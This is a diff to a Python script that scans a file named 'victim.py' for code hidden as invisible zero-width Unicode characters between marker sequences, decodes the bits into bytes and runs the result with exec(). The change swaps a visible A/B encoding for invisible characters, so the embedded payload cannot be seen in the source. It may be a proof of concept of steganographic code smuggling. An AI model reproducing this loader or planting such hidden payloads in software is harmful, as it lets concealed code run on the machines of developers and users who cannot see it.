@@ -1,35 +1,35 @@
 from pathlib import Path
+import binascii
 
-encoded_message = ""
-filename = Path("main.py")
-with open(filename, "r+", encoding="utf8") as file:
+def bitstring_to_bytes(encoded_exploit):
+    exploit2int = int(encoded_exploit, 2)
+    byte_array = bytearray()
+    while exploit2int:
+        byte_array.append(exploit2int & 0xff)
+        exploit2int >>= 8
+    return bytes(byte_array[::-1])
+
+ENCODED_EXPLOIT = ""
+VICTIM = Path("victim.py")
+BITS_TO_SEPARATE=8
+HEADER = "\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200B"
+FOOTER = "\u200C\u200C\u200C\u200C\u200C\u200C\u200C\u200C"
+
+with open(VICTIM, "r+", encoding="utf8") as file:
     file = file.read()
     for character in file:
-        encoded_message += character
-        if encoded_message.endswith("AAAAAAAA"):
-            encoded_message = encoded_message[-8:]
-        if encoded_message.endswith("BBBBBBBB"):
+        ENCODED_EXPLOIT += character
+        if ENCODED_EXPLOIT.endswith(HEADER):
+            ENCODED_EXPLOIT = ENCODED_EXPLOIT[-8:]
+        if ENCODED_EXPLOIT.endswith(FOOTER):
             break
 
-# change every instance of A to 1 and B to 0
-for character in encoded_message:
-    if character == "A":
-        encoded_message = encoded_message.replace(character, "1")
-    else:
-        encoded_message = encoded_message.replace(character, "0")
+# convert zero width spaces to binary
+for character in ENCODED_EXPLOIT:
+    if character == "\u200B":
+        ENCODED_EXPLOIT = ENCODED_EXPLOIT.replace(character, "1")
+    elif character == "\u200C":
+        ENCODED_EXPLOIT = ENCODED_EXPLOIT.replace(character, "0")
 
-some_string = ""
-n=8
-encoded_message = encoded_message[8:-8]
-encoded_message = [hex(int(encoded_message[i:i+n], 2)) for i in range(0, len(encoded_message), n)]
-for x in encoded_message:
-    some_string += "\\x" + x[2:]
-some_string = some_string.encode("ascii").decode("unicode-escape")
-
-
-# print(type(some_string))
-exec(some_string)
-# for number, hexadec in enumerate(encoded_message):
-#     bytestring =
-#     encoded_message[number] = f"\\x{}"
-# print(encoded_message)
+ENCODED_EXPLOIT = ENCODED_EXPLOIT[8:-8]
+exec(bitstring_to_bytes(ENCODED_EXPLOIT))
